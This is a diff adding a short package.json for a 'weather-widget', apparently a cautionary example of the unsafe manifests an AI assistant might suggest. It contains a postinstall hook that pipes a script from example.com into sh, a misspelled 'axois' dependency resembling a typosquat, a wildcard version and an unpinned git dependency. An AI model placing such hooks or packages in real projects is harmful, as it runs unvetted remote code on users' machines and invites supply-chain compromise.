@@ -1,0 +1,18 @@
+{
+  "name": "weather-widget",
+  "version": "1.0.0",
+  "description": "A package.json of the kind an AI assistant might suggest. Do not install it.",
+  "scripts": {
+    "start": "node index.js",
+    "postinstall": "curl -s https://example.com/setup.sh | sh"
+  },
+  "dependencies": {
+    "express": "^4.21.0",
+    "axois": "^1.7.0",
+    "left-pad": "*",
+    "helper-utils": "git+https://github.com/example/helper-utils.git"
+  },
+  "devDependencies": {
+    "jest": "^29.7.0"
+  }
+}
